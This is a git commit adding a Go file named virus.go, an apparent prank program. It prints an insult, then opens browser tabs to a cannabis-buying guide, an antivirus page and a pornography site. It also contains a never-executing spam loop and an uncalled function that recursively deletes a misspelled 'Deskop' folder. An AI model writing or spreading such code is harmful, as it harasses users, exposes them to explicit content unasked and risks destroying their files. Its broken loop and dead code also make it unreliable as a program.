29ff5404f81eb279f72a06e282522571614ce96e
Blockman <71958682+Blockman18@users.noreply.github.com>
2021-01-23 22:47:54 -0600

    Add files via upload

---
+++ virus.go
@@ -0,0 +1,47 @@
+package main 
+
+
+
+import (
+	"fmt"
+	"github.com/pkg/browser"
+	"os"
+
+
+
+)
+
+func main() {
+	var stupid string
+	fmt.Println("why did are u stupid do u want to be more stupid?:")
+	fmt.Scan(&stupid)
+	browser.OpenURL("https://www.thrillist.com/eat/nation/how-to-buy-weed-marijuana-dispensaries-guide")
+	browser.OpenURL("https://www.antivirussoftwareguide.com/best-free-antivirus")
+	browser.OpenURL("Pornhub.com")
+	
+	spam := 10
+	
+	for spam > 10 {
+		browser.OpenURL("https://www.avg.com/en-ca/ppc/tuneup?ppc_code=012&ppc=e&gclid=CjwKCAiAr6-ABhAfEiwADO4sfRf44cNJvIFTP21ut3gEMctANiKsqIxtcio-XUxrXvE8mK5a7Ndu8xoCoSQQAvD_BwE&gclsrc=aw.ds")
+
+		spam--
+
+
+
+
+	}
+
+
+
+
+}
+
+func delete() {
+		err := os.RemoveAll("Deskop")
+		if err != nil {
+		  fmt.Println(err)
+
+
+
+		}
+}
